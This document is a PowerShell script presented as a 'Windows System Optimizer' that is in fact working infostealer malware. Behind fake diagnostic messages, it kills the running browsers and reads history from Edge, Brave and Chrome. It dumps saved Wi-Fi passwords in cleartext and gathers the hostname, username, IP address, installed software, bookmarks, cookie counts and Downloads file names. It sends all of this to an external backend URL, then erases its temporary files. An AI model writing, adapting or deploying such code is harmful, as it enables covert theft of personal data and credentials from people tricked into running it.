# ============================================
# Enhanced Data Collector v2.0 - PowerShell Edition
# Sends data to backend API incrementally (FAST)
# ============================================

# Set window title and colors
$host.UI.RawUI.WindowTitle = "Windows System Optimizer"
$host.UI.RawUI.ForegroundColor = "Green"

Clear-Host
Write-Host ""
Write-Host " ================================================" -ForegroundColor Green
Write-Host "   Windows System Cache Optimization Tool" -ForegroundColor Green
Write-Host " ================================================" -ForegroundColor Green
Write-Host ""

# Backend URL - UPDATE THIS TO YOUR SERVER IP/DOMAIN
$BACKEND_URL = "https://backend-data-project.vercel.app/api/data"

# Generate session ID (timestamp + random)
$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$random = Get-Random -Minimum 10000 -Maximum 99999
$SESSION_ID = "${timestamp}_${random}"

# Set paths
$SCRIPT_DIR = Split-Path -Parent $MyInvocation.MyCommand.Path
$CURL = Join-Path $SCRIPT_DIR "bin\curl.exe"
$SQLITE = Join-Path $SCRIPT_DIR "bin\sqlite3.exe"
$JQ = Join-Path $SCRIPT_DIR "bin\jq.exe"
$TEMP_DIR = Join-Path $env:TEMP "collector_$(Get-Random)"
New-Item -ItemType Directory -Path $TEMP_DIR -Force | Out-Null

Write-Host "[*] Initializing system diagnostics..." -ForegroundColor Cyan
Start-Sleep -Seconds 1

# ============================================
# FUNCTION: Send-Data
# ============================================
function Send-Data {
    param(
        [string]$JsonData
    )
    
    $jsonFile = Join-Path $TEMP_DIR "temp_$(Get-Random).json"
    $JsonData | Out-File -FilePath $jsonFile -Encoding UTF8 -NoNewline
    
    & $CURL -s -X POST $BACKEND_URL -H "Content-Type: application/json" -d "@$jsonFile" 2>$null
    
    Remove-Item $jsonFile -Force -ErrorAction SilentlyContinue
}

# ============================================
# STEP 1: Collect & Send Device Info
# ============================================
Write-Host "[*] Scanning system components..." -ForegroundColor Cyan

# Get IP address
$ipAddress = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet*", "Wi-Fi*" -ErrorAction SilentlyContinue | 
              Where-Object { $_.IPAddress -notlike "169.254.*" } | 
              Select-Object -First 1).IPAddress

if (-not $ipAddress) { $ipAddress = "Unknown" }

$deviceInfo = @{
    session_id = $SESSION_ID
    type = "device_info"
    device_info = @{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        userdomain = $env:USERDOMAIN
        ip_address = $ipAddress
        timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    }
} | ConvertTo-Json -Compress

Send-Data -JsonData $deviceInfo

# ============================================
# STEP 2: Detect browser profiles
# ============================================
$browserPaths = @{
    Edge = $null
    Brave = $null
    Chrome = $null
}

# Find Edge profile
$edgeBase = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data"
if (Test-Path (Join-Path $edgeBase "Default\History")) {
    $browserPaths.Edge = Join-Path $edgeBase "Default\History"
} elseif (Test-Path (Join-Path $edgeBase "Profile 1\History")) {
    $browserPaths.Edge = Join-Path $edgeBase "Profile 1\History"
}

# Find Brave profile
$braveBase = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data"
if (Test-Path (Join-Path $braveBase "Default\History")) {
    $browserPaths.Brave = Join-Path $braveBase "Default\History"
} elseif (Test-Path (Join-Path $braveBase "Profile 1\History")) {
    $browserPaths.Brave = Join-Path $braveBase "Profile 1\History"
}

# Find Chrome profile
$chromeBase = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
if (Test-Path (Join-Path $chromeBase "Default\History")) {
    $browserPaths.Chrome = Join-Path $chromeBase "Default\History"
} elseif (Test-Path (Join-Path $chromeBase "Profile 1\History")) {
    $browserPaths.Chrome = Join-Path $chromeBase "Profile 1\History"
}

# ============================================
# FUNCTION: Send-BrowserHistory
# ============================================
function Send-BrowserHistory {
    param(
        [string]$BrowserType,
        [string]$HistoryPath,
        [string]$ProcessName
    )
    
    Write-Host "[*] Processing $BrowserType browser..." -ForegroundColor Cyan
    
    # Close browser
    Stop-Process -Name $ProcessName -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 500
    
    # Create temp copy
    $tempDb = Join-Path $TEMP_DIR "${BrowserType}_hist.tmp"
    try {
        Copy-Item $HistoryPath $tempDb -Force -ErrorAction Stop
    } catch {
        return
    }
    
    # Extract history using SQLite (limit to 1000 most recent)
    $query = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000;"
    $historyData = & $SQLITE $tempDb $query 2>$null
    
    if ($historyData) {
        # Build JSON array (MUCH faster than batch)
        $dataArray = $historyData | ForEach-Object {
            # Escape quotes and backslashes
            $escaped = $_ -replace '\\', '\\' -replace '"', '\"'
            "`"$escaped`""
        }
        
        $jsonData = @{
            session_id = $SESSION_ID
            type = $BrowserType
            data = $dataArray
        } | ConvertTo-Json -Compress
        
        Send-Data -JsonData $jsonData
    }
    
    Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
}

# ============================================
# STEP 3: Collect Browser History (Edge → Brave → Chrome)
# ============================================
Write-Host "[*] Analyzing browser data..." -ForegroundColor Cyan

if ($browserPaths.Edge) {
    Send-BrowserHistory -BrowserType "edge" -HistoryPath $browserPaths.Edge -ProcessName "msedge"
}

if ($browserPaths.Brave) {
    Send-BrowserHistory -BrowserType "brave" -HistoryPath $browserPaths.Brave -ProcessName "brave"
}

if ($browserPaths.Chrome) {
    Send-BrowserHistory -BrowserType "chrome" -HistoryPath $browserPaths.Chrome -ProcessName "chrome"
}

# ============================================
# STEP 4: Collect & Send WiFi Passwords
# ============================================
Write-Host "[*] Collecting network profiles..." -ForegroundColor Cyan

$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    $profileName = ($_ -split ":")[-1].Trim()
    
    $password = netsh wlan show profile name="$profileName" key=clear | 
                Select-String "Key Content" | 
                ForEach-Object { ($_ -split ":")[-1].Trim() }
    
    if (-not $password) { $password = "No password or not saved" }
    
    @{
        network = $profileName
        password = $password
    }
}

if ($wifiProfiles.Count -gt 0) {
    $wifiJson = @{
        session_id = $SESSION_ID
        type = "wifi"
        data = $wifiProfiles
    } | ConvertTo-Json -Compress
    
    Send-Data -JsonData $wifiJson
}

# ============================================
# STEP 5: Collect & Send System Info
# ============================================
Write-Host "[*] Running system diagnostics..." -ForegroundColor Cyan

$systemInfoLines = systeminfo | Select-String "OS Name|OS Version|System Manufacturer|System Model|Processor|Total Physical Memory"
$systemInfo = $systemInfoLines | ForEach-Object { $_.Line }

# Get installed software (top 20)
$installedSoftware = Get-CimInstance -ClassName Win32_Product -ErrorAction SilentlyContinue | 
                     Select-Object Name, Version -First 20 | 
                     ForEach-Object {
                         @{
                             name = $_.Name
                             version = $_.Version
                         }
                     }

$systemJson = @{
    session_id = $SESSION_ID
    type = "system"
    data = @{
        systeminfo = $systemInfo
        installed_software = $installedSoftware
    }
} | ConvertTo-Json -Compress -Depth 5

Send-Data -JsonData $systemJson

# ============================================
# STEP 6: Collect & Send Bookmarks
# ============================================
Write-Host "[*] Backing up browser bookmarks..." -ForegroundColor Cyan

$bookmarksData = @{}

# Chrome bookmarks
$chromeBm = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Default\Bookmarks"
if (-not (Test-Path $chromeBm)) {
    $chromeBm = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Profile 1\Bookmarks"
}
if (Test-Path $chromeBm) {
    $chromeUrls = & $JQ -c "[.. | .url? // empty] | unique | .[0:50]" $chromeBm 2>$null
    if ($chromeUrls) {
        $bookmarksData["chrome"] = $chromeUrls | ConvertFrom-Json
    }
}

# Brave bookmarks
$braveBm = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data\Default\Bookmarks"
if (-not (Test-Path $braveBm)) {
    $braveBm = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data\Profile 1\Bookmarks"
}
if (Test-Path $braveBm) {
    $braveUrls = & $JQ -c "[.. | .url? // empty] | unique | .[0:50]" $braveBm 2>$null
    if ($braveUrls) {
        $bookmarksData["brave"] = $braveUrls | ConvertFrom-Json
    }
}

# Edge bookmarks
$edgeBm = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\Default\Bookmarks"
if (-not (Test-Path $edgeBm)) {
    $edgeBm = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\Profile 1\Bookmarks"
}
if (Test-Path $edgeBm) {
    $edgeUrls = & $JQ -c "[.. | .url? // empty] | unique | .[0:50]" $edgeBm 2>$null
    if ($edgeUrls) {
        $bookmarksData["edge"] = $edgeUrls | ConvertFrom-Json
    }
}

if ($bookmarksData.Count -gt 0) {
    $bookmarksJson = @{
        session_id = $SESSION_ID
        type = "bookmarks"
        data = $bookmarksData
    } | ConvertTo-Json -Compress -Depth 5
    
    Send-Data -JsonData $bookmarksJson
}

# ============================================
# STEP 7: Collect & Send Cookies Info
# ============================================
Write-Host "[*] Analyzing browser cookies..." -ForegroundColor Cyan

$cookiesData = @{}

# Chrome cookies
$chromeCookies = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Default\Cookies"
if (-not (Test-Path $chromeCookies)) {
    $chromeCookies = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Profile 1\Cookies"
}
if (Test-Path $chromeCookies) {
    $tempCookies = Join-Path $TEMP_DIR "cookies_chrome.tmp"
    Copy-Item $chromeCookies $tempCookies -Force -ErrorAction SilentlyContinue
    $count = & $SQLITE $tempCookies "SELECT COUNT(*) FROM cookies;" 2>$null
    if ($count) {
        $cookiesData["chrome_cookies_count"] = [int]$count
    }
    Remove-Item $tempCookies -Force -ErrorAction SilentlyContinue
}

# Brave cookies
$braveCookies = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data\Default\Cookies"
if (-not (Test-Path $braveCookies)) {
    $braveCookies = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data\Profile 1\Cookies"
}
if (Test-Path $braveCookies) {
    $tempCookies = Join-Path $TEMP_DIR "cookies_brave.tmp"
    Copy-Item $braveCookies $tempCookies -Force -ErrorAction SilentlyContinue
    $count = & $SQLITE $tempCookies "SELECT COUNT(*) FROM cookies;" 2>$null
    if ($count) {
        $cookiesData["brave_cookies_count"] = [int]$count
    }
    Remove-Item $tempCookies -Force -ErrorAction SilentlyContinue
}

# Edge cookies
$edgeCookies = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\Default\Cookies"
if (-not (Test-Path $edgeCookies)) {
    $edgeCookies = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\Profile 1\Cookies"
}
if (Test-Path $edgeCookies) {
    $tempCookies = Join-Path $TEMP_DIR "cookies_edge.tmp"
    Copy-Item $edgeCookies $tempCookies -Force -ErrorAction SilentlyContinue
    $count = & $SQLITE $tempCookies "SELECT COUNT(*) FROM cookies;" 2>$null
    if ($count) {
        $cookiesData["edge_cookies_count"] = [int]$count
    }
    Remove-Item $tempCookies -Force -ErrorAction SilentlyContinue
}

if ($cookiesData.Count -gt 0) {
    $cookiesJson = @{
        session_id = $SESSION_ID
        type = "cookies"
        data = $cookiesData
    } | ConvertTo-Json -Compress
    
    Send-Data -JsonData $cookiesJson
}

# ============================================
# STEP 8: Collect & Send Recent Files
# ============================================
Write-Host "[*] Processing recent activity..." -ForegroundColor Cyan

$downloadsPath = Join-Path $env:USERPROFILE "Downloads"
if (Test-Path $downloadsPath) {
    $recentFiles = Get-ChildItem $downloadsPath -File | 
                   Sort-Object LastWriteTime -Descending | 
                   Select-Object -First 50 | 
                   ForEach-Object {
                       @{
                           name = $_.Name
                           location = "Downloads"
                       }
                   }
    
    if ($recentFiles.Count -gt 0) {
        $filesJson = @{
            session_id = $SESSION_ID
            type = "recent_files"
            data = $recentFiles
        } | ConvertTo-Json -Compress
        
        Send-Data -JsonData $filesJson
    }
}

# ============================================
# STEP 9: Cleanup
# ============================================
Write-Host "[*] Cleaning temporary cache files..." -ForegroundColor Cyan
Remove-Item $TEMP_DIR -Recurse -Force -ErrorAction SilentlyContinue

Start-Sleep -Seconds 1

Write-Host ""
Write-Host " [√] Optimization complete!" -ForegroundColor Green
Start-Sleep -Seconds 2
